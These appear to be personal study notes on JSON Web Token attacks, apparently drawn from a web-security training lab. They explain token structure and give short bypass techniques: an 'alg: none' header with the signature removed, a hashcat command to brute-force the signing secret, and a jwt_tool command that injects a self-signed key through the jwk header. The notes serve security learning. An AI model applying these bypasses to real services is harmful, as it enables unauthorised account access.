# JWT : JSON WEB Token

standardized format for sending cryptographically signed JSON data between systems.
A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot, as shown in the following example.

    eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA

The header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual "claims" about the user. For example, you can decode the payload from the token above to reveal the following claims:

    {
        "iss": "portswigger",
        "exp": 1648037164,
        "name": "Carlos Montoya",
        "sub": "carlos",
        "role": "blog_author",
        "email": "carlos@carlos-montoya.net",
        "iat": 1516239022
    }

# JWT auth bypass via flawed signature verification

Example, 

    {
        kid":"3601f8c8-61c2-403b-8f0f-6889d4853ffb",
        "alg":"none"
    }
change alg to none, and delete signature in the JWT

# Brute-force jwt to find password 

    hashcat -a 0 -m 16500 <jwt> <wordlist>

# Header injections 

According to specifications of JWT only `alg` header is mandatory, there are other headers that are used in JWT and attracts hackers. 
    
    jwk (json web key)
    jwu (json web url)
    kid  Provides an ID that servers can use to identify 

## Injecting self-signed JWTs via the jwk parameter
A JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.
Example :

    {
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "typ": "JWT",
        "alg": "RS256",
        "jwk": {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
        }
    }

when it's like this, we generate out own RSA key pairs, and sign the JWT outselves.
using jwt_tools
take the token into jwt_tools.py

    python3 jwt_tool.py <JWT token> -X i -T

and then change the paramateres for the attack 
PS : watchout the KID needs to be the same in both fields

// to create own script helpful link 
https://ktor.io/docs/rsa-keys-generation.html#populating-the-jwks-json-file